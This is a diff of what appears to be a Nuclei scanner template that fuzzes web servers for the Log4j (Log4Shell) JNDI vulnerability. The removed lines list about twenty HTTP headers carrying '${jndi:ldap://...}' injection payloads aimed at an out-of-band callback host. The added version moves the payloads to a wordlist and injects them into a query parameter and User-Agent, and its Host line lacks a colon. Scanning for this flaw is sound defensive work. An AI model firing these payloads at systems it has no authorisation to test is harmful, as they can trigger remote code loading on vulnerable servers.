@@ -1,55 +1,27 @@
-id: log4j-fuzz-head-poc-v2
+id: log4j-fuzz
 
 info:
-  name: log4j-fuzz-v1
-  author: rdnt
+  name: log4j Fuzzing
+  author: pikpikcu
   severity: critical
-  tags: apache,rce
+  tags: log4j,fuzz
 
 requests:
+
   - raw:
       - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        {{log4j_payloads}}
+        GET /?tes={{header}} HTTP/1.1
+        Host {{Hostname}}
+        User-Agent: {{header}}
 
-      - |
-        POST / HTTP/1.1
-        Host: {{Hostname}}
-        {{log4j_payloads}}
     payloads:
-      log4j_payloads:
-        - 'X-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
-        - 'X-Remote-IP: ${jndi:ldap://{{interactsh-url}}/info}'
-        - 'X-Remote-Addr: ${jndi:ldap://{{interactsh-url}}/info}'
-        - 'X-Forwarded-For: ${jndi:ldap://{{interactsh-url}}/info}'
-        - 'X-Originating-IP: ${jndi:ldap://{{interactsh-url}}/info}'
-        - 'User-Agent: ${jndi:ldap://{{interactsh-url}}/info}'
-        - 'Referer: ${jndi:ldap://{{interactsh-url}}/info}'
-        - 'CF-Connecting_IP: ${jndi:ldap://{{interactsh-url}}/info}'
-        - 'True-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
-        - 'X-Forwarded-For: ${jndi:ldap://{{interactsh-url}}/info}'
-        - 'Originating-IP: ${jndi:ldap://{{interactsh-url}}/info}'
-        - 'X-Real-IP: ${jndi:ldap://{{interactsh-url}}/info}'
-        - 'X-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
-        - 'Forwarded: ${jndi:ldap://{{interactsh-url}}/info}'
-        - 'Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
-        - 'Contact: ${jndi:ldap://{{interactsh-url}}/info}'
-        - 'X-Wap-Profile: ${jndi:ldap://{{interactsh-url}}/info}'
-        - 'X-Api-Version: ${jndi:ldap://{{interactsh-url}}/info}'
-        - 'Host: ${jndi:ldap://{{interactsh-url}}/info}'
-                
-    attack: clusterbomb
-    matchers-condition: or
+      header: helpers/wordlists/log4j.txt
+
+    matchers-condition: and
     matchers:
+
       - type: word
-        part: interactsh_protocol
-        name: http
+        part: interactsh_protocol # Confirms the DNS Interaction
         words:
           - "http"
-
-      - type: word
-        part: interactsh_protocol
-        name: dns
-        words:
           - "dns"
